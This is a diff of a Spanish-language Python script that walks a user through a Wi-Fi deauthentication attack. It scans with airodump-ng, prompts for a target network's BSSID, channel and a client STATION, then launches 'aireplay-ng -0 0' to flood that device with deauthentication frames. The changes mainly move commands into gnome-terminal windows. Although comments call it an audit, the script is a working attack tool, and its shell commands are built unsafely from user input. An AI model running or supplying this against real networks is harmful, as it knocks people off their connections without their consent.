@@ -11,9 +11,9 @@ def ejecutar_comando(comando):
         print(f"Error al ejecutar el comando: {comando}")
 
 def abrir_en_ventana(comando, titulo=""):
-    """Abre un comando en una ventana separada (xterm)."""
+    """Abre un comando en una ventana separada (gnome-terminal)."""
     try:
-        subprocess.Popen(f"xterm -hold -T '{titulo}' -e '{comando}'", shell=True)
+        subprocess.Popen(f"gnome-terminal -- bash -c \"echo '{titulo}'; {comando}; exec bash\"", shell=True)
     except Exception as e:
         print(f"Error al abrir la ventana: {e}")
 
@@ -33,26 +33,24 @@ def main():
 
     # Escanear redes disponibles
     print("\nAbriendo escáner de redes en una nueva ventana...")
-    abrir_en_ventana(f"airodump-ng --band a {tarjeta_red}", "Escáner de Redes 2.4 GHz")
-    abrir_en_ventana(f"airodump-ng --band bg {tarjeta_red}", "Escáner de Redes 5.0 GHz")
-    input("\nObserva la ventana del escáner. Cuando tengas el BSSID y el canal de la red (CH) objetivo, vuelve aquí y presiona Enter para continuar.")
+    abrir_en_ventana(f"airodump-ng --band a {tarjeta_red}", "Escáner de Redes")
+    input("\nObserva la ventana del escáner. Cuando tengas el BSSID y el canal de la red objetivo, vuelve aquí y presiona Enter para continuar.")
 
-    # Solicitar información de la red a auditare
+    # Solicitar información de la red a auditar
     bssid = input("\nIntroduce el BSSID de la red objetivo: ").strip()
     canal = input("Introduce el canal (CH) de la red objetivo: ").strip()
 
     # Monitorear la red específica
     print(f"\nAbriendo monitoreo de la red {bssid} en una nueva ventana...")
     abrir_en_ventana(f"airodump-ng --band a -c {canal} --bssid {bssid} {tarjeta_red}", "Monitoreo de Red")
-    print("--> Realiza prueba y error con los sigueintes dispositivos hasta encontrar el deseado.")
-    input("\nObserva la ventana del monitoreo. Cuando identifiques el dispositivo objetivo anota el STATION, vuelve aquí y presiona Enter para continuar.")
+    input("\nObserva la ventana del monitoreo. Cuando identifiques el dispositivo objetivo, vuelve aquí y presiona Enter para continuar.")
 
     # Solicitar información del dispositivo objetivo
     station = input("\nIntroduce el STATION (dispositivo objetivo): ").strip()
 
     # Intentar desautenticar el dispositivo
-    print(f"\nEnviando desautenticación al dispositivo {station}...")
-    ejecutar_comando(f"aireplay-ng -0 0 -a {bssid} -c {station} {tarjeta_red}")
+    print(f"\nEnviando desautenticación al dispositivo {station} en una nueva ventana...")
+    abrir_en_ventana(f"aireplay-ng -0 0 -a {bssid} -c {station} {tarjeta_red}", "Desautenticación en Proceso")
 
     print("\nSi este no es el dispositivo deseado, reinicia el script y prueba con otro STATION.\n")
 
